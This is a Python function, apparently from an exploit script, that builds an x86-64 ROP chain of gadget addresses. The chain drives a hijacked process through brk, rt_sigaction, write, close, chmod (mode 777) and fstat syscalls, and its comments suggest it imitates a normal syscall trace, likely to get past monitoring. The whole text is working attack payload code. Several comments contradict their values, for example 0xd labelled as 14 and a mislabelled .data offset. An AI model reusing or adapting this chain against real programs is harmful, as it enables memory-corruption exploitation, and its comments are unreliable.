def do_1(p):
	
	# call brk 0xecc000 (identified normal value in trace)
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call brk again
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret
	
	# call brk again
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret
	
	# call brk again
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000fcc000) # some address

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000c) # 12 brk
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

	# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call rt_sigaction
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000004) # 4 signum

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000000d) # 14 rt_sigaction
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

#call write

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret #fd
	p += pack("<Q", 0x0000000000000004) # 4 fd

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8
	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += "12345678" # 12345678
	p += pack("<Q", 0x00000000004150ab) # mov QWORD PTR [rdx],rax ; ret

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data + 8

	p += pack("<Q", 0x0000000000435404) # pop rdx ; ret
	p += pack("<Q", 0x0000000000000008) # number of bytes 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000001) # 1 write
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call close
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000009) # fd 9

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000003) # 3 close
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call chmod

	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x00000000006d68a0) # @ .data
	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x0000000000000777) # 777 mode

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x000000000000005a) # 90 chmod
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret

# call fstat
	p += pack("<Q", 0x000000000040c298) # pop rdi ; ret
	p += pack("<Q", 0x0000000000000001) # stdout

	p += pack("<Q", 0x000000000040c6b7) # pop rsi ; ret
	p += pack("<Q", 0x00000000006d68a8) # @ .data + 8

	p += pack("<Q", 0x000000000043833e) # pop rax ; ret
	p += pack("<Q", 0x0000000000000005) # 5 fstat
	p += pack("<Q", 0x000000000046ec25) # syscall ; ret
